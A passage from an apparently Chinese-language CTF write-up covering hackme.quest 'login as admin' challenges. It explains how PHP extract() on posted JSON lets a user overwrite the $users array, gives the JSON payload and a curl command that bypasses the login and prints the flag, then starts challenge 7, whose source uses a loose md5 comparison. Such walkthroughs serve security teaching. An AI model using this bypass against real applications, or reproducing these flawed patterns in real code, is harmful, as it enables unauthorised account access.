</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 93</span><span>                password.value <span style=color:#ff6ac1>=</span> <span style=color:#ff6ac1>null</span>;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 94</span><span>            };
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 95</span><span>            &lt;/<span style=color:#ff6ac1>script</span>&gt;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 96</span><span><span style=color:#78787e>&lt;?php</span> <span style=color:#ff6ac1>else</span><span style=color:#ff6ac1>:</span> <span style=color:#78787e>?&gt;</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 97</span><span>            &lt;<span style=color:#ff6ac1>h3</span>&gt;Hi, <span style=color:#78787e>&lt;?</span><span style=color:#ff6ac1>=</span>htmlentities(<span style=color:#ff5c57>$username</span>)<span style=color:#78787e>?&gt;</span>&lt;/<span style=color:#ff6ac1>h3</span>&gt;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 98</span><span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 99</span><span>            &lt;<span style=color:#ff6ac1>h4</span>&gt;<span style=color:#78787e>&lt;?</span><span style=color:#ff6ac1>=</span>sprintf(<span style=color:#5af78e>&#34;You %s admin!&#34;</span>, <span style=color:#ff5c57>$user</span> <span style=color:#ff6ac1>==</span> <span style=color:#5af78e>&#39;admin&#39;</span> <span style=color:#ff6ac1>?</span> <span style=color:#5af78e>&#34;are&#34;</span> <span style=color:#ff6ac1>:</span> <span style=color:#5af78e>&#34;are not&#34;</span>)<span style=color:#78787e>?&gt;</span>&lt;/<span style=color:#ff6ac1>h4</span>&gt;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">100</span><span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">101</span><span>            <span style=color:#78787e>&lt;?php</span> <span style=color:#ff6ac1>if</span>(<span style=color:#ff5c57>$user</span> <span style=color:#ff6ac1>==</span> <span style=color:#5af78e>&#39;admin&#39;</span>) printf(<span style=color:#5af78e>&#34;&lt;code&gt;%s&lt;/code&gt;&#34;</span>, htmlentities(<span style=color:#ff5c57>$flag</span>)); <span style=color:#78787e>?&gt;</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">102</span><span><span style=color:#78787e>&lt;?php</span> <span style=color:#ff6ac1>endif</span>; <span style=color:#78787e>?&gt;</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">103</span><span>        &lt;/<span style=color:#ff6ac1>div</span>&gt;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">104</span><span>    &lt;/<span style=color:#ff6ac1>div</span>&gt;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">105</span><span>&lt;/<span style=color:#ff6ac1>body</span>&gt;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">106</span><span>&lt;/<span style=color:#ff6ac1>html</span>&gt;
</span></span></code></pre></div><hr><p>這題有點多此一舉，驗證帳號密碼不依賴<code>$_POST['username']</code>及<code>$_POST['password']</code>，而是將其打包成<code>json</code>格式作為<code>$_POST['data']</code>送出。<br>並且在接收時，做了個很危險的動作，就是使用<code>extract()</code> function。</p><p>該 function 會將 json 當中的<code>key</code>作為變數名稱，<code>value</code>作為該變數的值<strong>在程式碼中直接使用</strong>。</p><p>而要繞過得判斷式則有「<code>$users[$username]</code>」該用戶名稱必須存在於<code>$users</code>變數當中，以及「<code>strcmp($users[$username], $password) == 0</code>」該變數中的帳號的值與密碼相同。<br>因此不難理解，只需要手動建立變數來覆蓋原本的設定檔即可，payload 大概會長這樣：</p><div class=highlight><pre tabindex=0 style=color:#e2e4e5;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-json data-lang=json><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">1</span><span><span style=color:#5af78e>&#34;data&#34;</span><span style=color:#ff5c57>:</span>{
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">2</span><span>    <span style=color:#ff6ac1>&#34;username&#34;</span>: <span style=color:#5af78e>&#34;admin&#34;</span>,
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">3</span><span>    <span style=color:#ff6ac1>&#34;password&#34;</span>: <span style=color:#5af78e>&#34;admin&#34;</span>,
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">4</span><span>    <span style=color:#ff6ac1>&#34;users&#34;</span>:{
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">5</span><span>        <span style=color:#ff6ac1>&#34;admin&#34;</span>: <span style=color:#5af78e>&#34;admin&#34;</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">6</span><span>    }
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">7</span><span>}
</span></span></code></pre></div><p>發送封包：</p><div class=highlight><pre tabindex=0 style=color:#e2e4e5;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">1</span><span>curl -X POST -d <span style=color:#5af78e>&#34;data={\&#34;username\&#34;:\&#34;admin\&#34;,\&#34;password\&#34;:\&#34;admin\&#34;,\&#34;users\&#34;:{\&#34;admin\&#34;:\&#34;admin\&#34;}}&#34;</span> https://ctf.hackme.quest/login6/
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#e2e4e5;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-html data-lang=html><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1</span><span><span style=color:#78787e>&lt;!DOCTYPE html&gt;</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2</span><span>&lt;<span style=color:#ff6ac1>html</span> <span style=color:#57c7ff>lang</span><span style=color:#ff6ac1>=</span><span style=color:#5af78e>&#34;en&#34;</span>&gt;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3</span><span>&lt;<span style=color:#ff6ac1>head</span>&gt;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4</span><span>    &lt;<span style=color:#ff6ac1>meta</span> <span style=color:#57c7ff>charset</span><span style=color:#ff6ac1>=</span><span style=color:#5af78e>&#34;UTF-8&#34;</span>&gt;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5</span><span>    &lt;<span style=color:#ff6ac1>title</span>&gt;Login As Admin 6&lt;/<span style=color:#ff6ac1>title</span>&gt;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6</span><span>    &lt;<span style=color:#ff6ac1>meta</span> <span style=color:#57c7ff>name</span><span style=color:#ff6ac1>=</span><span style=color:#5af78e>&#34;viewport&#34;</span> <span style=color:#57c7ff>content</span><span style=color:#ff6ac1>=</span><span style=color:#5af78e>&#34;width=device-width, initial-scale=1&#34;</span>&gt;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7</span><span>    &lt;<span style=color:#ff6ac1>link</span> <span style=color:#57c7ff>rel</span><span style=color:#ff6ac1>=</span><span style=color:#5af78e>&#34;stylesheet&#34;</span> <span style=color:#57c7ff>href</span><span style=color:#ff6ac1>=</span><span style=color:#5af78e>&#34;/bootstrap/css/bootstrap.min.css&#34;</span> <span style=color:#57c7ff>media</span><span style=color:#ff6ac1>=</span><span style=color:#5af78e>&#34;all&#34;</span>&gt;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8</span><span>&lt;/<span style=color:#ff6ac1>head</span>&gt;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9</span><span>&lt;<span style=color:#ff6ac1>body</span>&gt;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">10</span><span>    &lt;<span style=color:#ff6ac1>div</span> <span style=color:#57c7ff>class</span><span style=color:#ff6ac1>=</span><span style=color:#5af78e>&#34;jumbotron&#34;</span>&gt;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">11</span><span>        &lt;<span style=color:#ff6ac1>div</span> <span style=color:#57c7ff>class</span><span style=color:#ff6ac1>=</span><span style=color:#5af78e>&#34;container&#34;</span>&gt;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">12</span><span>            &lt;<span style=color:#ff6ac1>h1</span>&gt;Login as Admin 6&lt;/<span style=color:#ff6ac1>h1</span>&gt;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">13</span><span>        &lt;/<span style=color:#ff6ac1>div</span>&gt;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">14</span><span>    &lt;/<span style=color:#ff6ac1>div</span>&gt;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">15</span><span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">16</span><span>    &lt;<span style=color:#ff6ac1>div</span> <span style=color:#57c7ff>class</span><span style=color:#ff6ac1>=</span><span style=color:#5af78e>&#34;container&#34;</span>&gt;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">17</span><span>        &lt;<span style=color:#ff6ac1>div</span> <span style=color:#57c7ff>class</span><span style=color:#ff6ac1>=</span><span style=color:#5af78e>&#34;navbar&#34;</span>&gt;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">18</span><span>            &lt;<span style=color:#ff6ac1>div</span> <span style=color:#57c7ff>class</span><span style=color:#ff6ac1>=</span><span style=color:#5af78e>&#34;container-fluid&#34;</span>&gt;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">19</span><span>                &lt;<span style=color:#ff6ac1>div</span> <span style=color:#57c7ff>class</span><span style=color:#ff6ac1>=</span><span style=color:#5af78e>&#34;navbar-header&#34;</span>&gt;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">20</span><span>                    &lt;<span style=color:#ff6ac1>a</span> <span style=color:#57c7ff>class</span><span style=color:#ff6ac1>=</span><span style=color:#5af78e>&#34;navbar-brand&#34;</span> <span style=color:#57c7ff>href</span><span style=color:#ff6ac1>=</span><span style=color:#5af78e>&#34;/&#34;</span>&gt;Please Hack Me&lt;/<span style=color:#ff6ac1>a</span>&gt;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">21</span><span>                &lt;/<span style=color:#ff6ac1>div</span>&gt;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">22</span><span>                &lt;<span style=color:#ff6ac1>ul</span> <span style=color:#57c7ff>class</span><span style=color:#ff6ac1>=</span><span style=color:#5af78e>&#34;nav navbar-nav&#34;</span>&gt;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">23</span><span>                    &lt;<span style=color:#ff6ac1>li</span>&gt;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">24</span><span>                        &lt;<span style=color:#ff6ac1>a</span> <span style=color:#57c7ff>href</span><span style=color:#ff6ac1>=</span><span style=color:#5af78e>&#34;/scoreboard&#34;</span>&gt;Scoreboard&lt;/<span style=color:#ff6ac1>a</span>&gt;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">25</span><span>                    &lt;/<span style=color:#ff6ac1>li</span>&gt;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">26</span><span>                    &lt;<span style=color:#ff6ac1>li</span>&gt;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">27</span><span>                        &lt;<span style=color:#ff6ac1>a</span> <span style=color:#57c7ff>href</span><span style=color:#ff6ac1>=</span><span style=color:#5af78e>&#34;?show_source=1&#34;</span> <span style=color:#57c7ff>target</span><span style=color:#ff6ac1>=</span><span style=color:#5af78e>&#34;_blank&#34;</span>&gt;Source Code&lt;/<span style=color:#ff6ac1>a</span>&gt;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">28</span><span>                    &lt;/<span style=color:#ff6ac1>li</span>&gt;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">29</span><span>                &lt;/<span style=color:#ff6ac1>ul</span>&gt;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">30</span><span>            &lt;/<span style=color:#ff6ac1>div</span>&gt;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">31</span><span>        &lt;/<span style=color:#ff6ac1>div</span>&gt;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">32</span><span>    &lt;/<span style=color:#ff6ac1>div</span>&gt;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">33</span><span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">34</span><span>    &lt;<span style=color:#ff6ac1>div</span> <span style=color:#57c7ff>class</span><span style=color:#ff6ac1>=</span><span style=color:#5af78e>&#34;container&#34;</span>&gt;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">35</span><span>        &lt;<span style=color:#ff6ac1>div</span> <span style=color:#57c7ff>class</span><span style=color:#ff6ac1>=</span><span style=color:#5af78e>&#34;col-md-6 col-md-offset-3&#34;</span>&gt;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">36</span><span>            &lt;<span style=color:#ff6ac1>h3</span>&gt;Hi, admin&lt;/<span style=color:#ff6ac1>h3</span>&gt;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">37</span><span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">38</span><span>            &lt;<span style=color:#ff6ac1>h4</span>&gt;You are admin!&lt;/<span style=color:#ff6ac1>h4</span>&gt;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">39</span><span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">40</span><span>            &lt;<span style=color:#ff6ac1>code</span>&gt;FLAG{Oops, I fucked up your user database}&lt;/<span style=color:#ff6ac1>code</span>&gt;        &lt;/<span style=color:#ff6ac1>div</span>&gt;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">41</span><span>    &lt;/<span style=color:#ff6ac1>div</span>&gt;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">42</span><span>&lt;/<span style=color:#ff6ac1>body</span>&gt;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">43</span><span>&lt;/<span style=color:#ff6ac1>html</span>&gt;
</span></span></code></pre></div><p>Flag <code>FLAG{Oops, I fucked up your user database}</code></p><hr><h2 class="relative group">28. <a href=https://ctf.hackme.quest/login7 target=_blank>login as admin 7</a><div id=28-login-as-admin-7httpsctfhackmequestlogin7 class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style=text-decoration-line:none!important href=#28-login-as-admin-7httpsctfhackmequestlogin7 aria-label=定位點>#</a></span></h2><blockquote><p>login as admin</p></blockquote><p>Source code:</p><div class=highlight><pre tabindex=0 style=color:#e2e4e5;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-phtml data-lang=phtml><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1</span><span><span style=color:#78787e>&lt;?php</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2</span><span><span style=color:#ff6ac1>require</span>(<span style=color:#5af78e>&#39;config.php&#39;</span>);
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3</span><span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4</span><span><span style=color:#ff6ac1>if</span>(<span style=color:#ff5c57>$_GET</span>[<span style=color:#5af78e>&#39;show_source&#39;</span>] <span style=color:#ff6ac1>===</span> <span style=color:#5af78e>&#39;1&#39;</span>) {
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5</span><span>    highlight_file(<span style=color:#ff9f43>__FILE__</span>);
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6</span><span>    <span style=color:#ff6ac1>exit</span>;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7</span><span>}
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8</span><span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9</span><span><span style=color:#ff6ac1>if</span>(<span style=color:#ff5c57>$_POST</span>[<span style=color:#5af78e>&#39;name&#39;</span>] <span style=color:#ff6ac1>==</span> <span style=color:#5af78e>&#39;admin&#39;</span> <span style=color:#ff6ac1>&amp;&amp;</span> md5(<span style=color:#ff5c57>$_POST</span>[<span style=color:#5af78e>&#39;password&#39;</span>]) <span style=color:#ff6ac1>==</span> <span style=color:#5af78e>&#39;00000000000000000000000000000000&#39;</span>) {
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">10</span><span>    <span style=color:#78787e>// admin account is disabled by give a impossible md5 hash
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">11</span><span><span style=color:#78787e></span>    <span style=color:#ff5c57>$user</span> <span style=color:#ff6ac1>=</span> <span style=color:#5af78e>&#39;admin&#39;</span>;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">12</span><span>} <span style=color:#ff6ac1>elseif</span>(<span style=color:#ff5c57>$_POST</span>[<span style=color:#5af78e>&#39;name&#39;</span>] <span style=color:#ff6ac1>==</span> <span style=color:#5af78e>&#39;guest&#39;</span> <span style=color:#ff6ac1>&amp;&amp;</span> md5(<span style=color:#ff5c57>$_POST</span>[<span style=color:#5af78e>&#39;password&#39;</span>]) <span style=color:#ff6ac1>==</span> <span style=color:#5af78e>&#39;084e0343a0486ff05530df6c705c8bb4&#39;</span>) {
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">13</span><span>    <span style=color:#ff5c57>$user</span> <span style=color:#ff6ac1>=</span> <span style=color:#5af78e>&#39;guest&#39;</span>;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">14</span><span>} <span style=color:#ff6ac1>elseif</span>(isset(<span style=color:#ff5c57>$_POST</span>[<span style=color:#5af78e>&#39;name&#39;</span>])) {
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">15</span><span>    <span style=color:#ff5c57>$user</span> <span style=color:#ff6ac1>=</span> <span style=color:#ff6ac1>false</span>;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">16</span><span>}
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">17</span><span><span style=color:#78787e>?&gt;&lt;!DOCTYPE html&gt;</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">18</span><span>&lt;<span style=color:#ff6ac1>html</span> <span style=color:#57c7ff>lang</span><span style=color:#ff6ac1>=</span><span style=color:#5af78e>&#34;en&#34;</span>&gt;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">19</span><span>&lt;<span style=color:#ff6ac1>head</span>&gt;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">20</span><span>    &lt;<span style=color:#ff6ac1>meta</span> <span style=color:#57c7ff>charset</span><span style=color:#ff6ac1>=</span><span style=color:#5af78e>&#34;UTF-8&#34;</span>&gt;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">21</span><span>    &lt;<span style=color:#ff6ac1>title</span>&gt;Login As Admin 7&lt;/<span style=color:#ff6ac1>title</span>&gt;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">22</span><span>    &lt;<span style=color:#ff6ac1>meta</span> <span style=color:#57c7ff>name</span><span style=color:#ff6ac1>=</span><span style=color:#5af78e>&#34;viewport&#34;</span> <span style=color:#57c7ff>content</span><span style=color:#ff6ac1>=</span><span style=color:#5af78e>&#34;width=device-width, initial-scale=1&#34;</span>&gt;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">23</span><span>    &lt;<span style=color:#ff6ac1>link</span> <span style=color:#57c7ff>rel</span><span style=color:#ff6ac1>=</span><span style=color:#5af78e>&#34;stylesheet&#34;</span> <span style=color:#57c7ff>href</span><span style=color:#ff6ac1>=</span><span style=color:#5af78e>&#34;/bootstrap/css/bootstrap.min.css&#34;</span> <span style=color:#57c7ff>media</span><span style=color:#ff6ac1>=</span><span style=color:#5af78e>&#34;all&#34;</span>&gt;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">24</span><span>&lt;/<span style=color:#ff6ac1>head</span>&gt;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">25</span><span>&lt;<span style=color:#ff6ac1>body</span>&gt;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">26</span><span>    &lt;<span style=color:#ff6ac1>div</span> <span style=color:#57c7ff>class</span><span style=color:#ff6ac1>=</span><span style=color:#5af78e>&#34;jumbotron&#34;</span>&gt;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">27</span><span>        &lt;<span style=color:#ff6ac1>div</span> <span style=color:#57c7ff>class</span><span style=color:#ff6ac1>=</span><span style=color:#5af78e>&#34;container&#34;</span>&gt;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">28</span><span>            &lt;<span style=color:#ff6ac1>h1</span>&gt;Login as Admin 7&lt;/<span style=color:#ff6ac1>h1</span>&gt;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">29</span><span>        &lt;/<span style=color:#ff6ac1>div</span>&gt;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">30</span><span>    &lt;/<span style=color:#ff6ac1>div</span>&gt;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">31</span><span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">32</span><span>    &lt;<span style=color:#ff6ac1>div</span> <span style=color:#57c7ff>class</span><span style=color:#ff6ac1>=</span><span style=color:#5af78e>&#34;container&#34;</span>&gt;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">33</span><span>        &lt;<span style=color:#ff6ac1>div</span> <span style=color:#57c7ff>class</span><span style=color:#ff6ac1>=</span><span style=color:#5af78e>&#34;navbar&#34;</span>&gt;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">34</span><span>            &lt;<span style=color:#ff6ac1>div</span> <span style=color:#57c7ff>class</span><span style=color:#ff6ac1>=</span><span style=color:#5af78e>&#34;container-fluid&#34;</span>&gt;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">35</span><span>                &lt;<span style=color:#ff6ac1>div</span> <span style=color:#57c7ff>class</span><span style=color:#ff6ac1>=</span><span style=color:#5af78e>&#34;navbar-header&#34;</span>&gt;
